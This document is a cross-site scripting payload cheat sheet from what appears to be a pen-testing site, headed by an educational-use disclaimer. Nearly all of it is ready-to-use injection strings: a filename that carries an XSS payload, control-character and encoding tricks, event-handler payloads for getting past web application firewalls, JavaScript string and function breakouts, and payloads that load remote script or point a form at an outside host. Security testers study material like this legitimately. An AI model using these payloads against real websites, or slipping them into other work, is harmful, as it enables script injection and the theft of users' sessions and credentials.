Warning
==============

All the information provided on this site is for educational purposes only.

The site or the authors are not responsible for any misuse of the information.

You shall not misuse the information to gain unauthorized access and/or write malicious programs.

These information shall only be used to expand knowledge and not for causing malicious or damaging attacks.


Linux filenames and uploads
==============
This has been a trick I have used for years. When I am lazy, I find my trusty file
```html
<img src=a onerror=prompt()>.pdf
```
Linux allows you to create this file. Windows, well they don't. Use this if you are lazy like me.
```bash
touch "<img src=a onerror=prompt()>.pdf"
```

Able to inject script, iframe, anchor but something is parsing your input?
==============
%0A,%1A,%0B,%1B,%0C,%1C,%0D,%1D,%0E,%1E,%0F,%1F may be able to help you
```html
http://yourhost/blah?Parameter="><a href="%0F%1Fjavascript:prompt(123)">asdf
http://yourhost/blah?Parameter="><iframe src="%0F%1Fhttps://www.aswsec.com/"></iframe>
http://yourhost/blah?Parameter="><script src="%0B%1Fhttps://www.aswsec.com/pen-test/simple.js"></script>
```

Did you break out of a tag and script, iframe, img, a, etc are all blocked by the WAF?
==============

Did they block onerror onload onclick? It is important to remember that the basic events work even with elements not part of html. Try something like this:
```html
<XXXXXXX ondblclick=prompt(1)>Some Text, Don't even care to end the tag either.
```
If you just need to break out for Proof of Concept and can't use a > to close your tag, this will utilize the " or ' in your injection depending on the developer's choice for the attribute you are breaking.
```html
" onclick="prompt(1)
' onclick='prompt(1)
```
WAF got you down? There are a ton of bypasses, look at HTML5 for more ideas also (Just remember IE vs Firefox and HTML5 support.
```html
<body onpageshow="prompt(123)">
<details open ontoggle="prompt('xss via toggle')">Toggle Me For More prompts</details>
<details/open/ontoggle="alert`1`">
<video onmouseenter=prompt(123)>
<video onwheel=prompt(123)>
<math><maction actiontype="statusline" 
xlink:href="http://www.aswsec.com/pen-test/x.svg">CLICKME<mtext></mtext></maction>
<button/formaction=https://www.aswsec.com/pen-test/validateLogin.html>Login<!--
```
Here you will find a great resource: https://html5sec.org/

Here you will find more ideas:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection

Don't forget the injection might not be a form tag but in the javascript.
==============
```html
";prompt(1);//

';prompt(1);//
```

What if they are in a function? Break out of it. Count the brackets, etc to kill the function.
```html
"};prompt(1);//
```
You may need to reconstruct the function
```html
"};prompt(1);function whatever(){//
```
Sometimes you can't reconstruct but you can make the Javascript right
```
"},function(data){});prompt(1);(//
```
Don't forget %0D%0A if you need a new line and it renders as a new line

Obscure Breakout
==============
If you copy the two alerts and paste into the Console of the web browser, execute and get NaN
```html
EXTREMELY Useful if you can't use ; or // to escape your function calls. You may have to
reconstruct your functions using ') or matching the total number of parameters and you may have to
clean up the end by calling the function again and passing useless data, but you javascript has to be correct.
alert(1)+alert(2)
NaN
```
```html
a'*prompt(123)*'
<script>
var a = 'a'*prompt(123)*'a';
var b = "a"*prompt(456)*"a";
</script>
```
```
http://yourtarget/whatever?a=<a &a= onclick=prompt(123) &a= >adsf
```
That would render potentially
```html
<a , onclick=prompt(123) , >asdf
```
Event Handlers You Should Investigate to bypass WAF
==============
https://www.w3.org/TR/html52/single-page.html

When you can't use spaces
==============
```html
<details/open/ontoggle=prompt(123)>
```
When the text is forced UPPERCASE
==============
```html
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```
Just for fun
==============
```html
<a/href="data:text/html;charset=utf-8,<script>alert(123)</script>">Just Interesting</a>
```
Internet Explorer can be your friend
==============
A lot of times you will notice that " or ' has become %22 or %27 in Chrome, Firefox, Opera etc. But did you try Internet Explorer. Many times you can get an Internet Explorer only XSS due to how the browser works.

Interesting XSS
==============
```html
<xxxxxx onmouseover=confirm(/Mouse&nbsp;Test&nbsp;It/.source)>Example 123
<img src=a onerror="self['prompt'](2)">
```
Just a few things to remember
==============
```
%3c -- <
%3e -- >
%2b -- + (this is important for sql injection)
%26%2360; -- <
%26%2362; -- >
\u003C -- <
\x27 -- '
%26lt; or %26lt -- <
%26gt; or %26gt -- >
```
Double Encoding Example
```
%253c
```
Triple Encoding
```
%25253c
```
Override the getter for User Agent is pulled from browser vs header
```javascript
navigator.__defineGetter__('userAgent',function(){return '<details open ontoggle=prompt(\'asdf\')>'});navigator.userAgent
```

